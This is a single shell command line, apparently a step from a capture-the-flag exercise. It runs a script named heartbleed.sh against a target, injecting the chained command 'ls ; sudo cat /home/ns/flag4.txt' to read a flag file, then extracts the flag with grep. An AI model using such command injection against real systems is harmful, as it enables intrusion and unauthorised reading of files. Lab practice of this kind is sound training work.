./heartbleed.sh $1 "ls ; sudo cat  /home/ns/flag4.txt" | grep -o 'flag4{.*}' | recode html
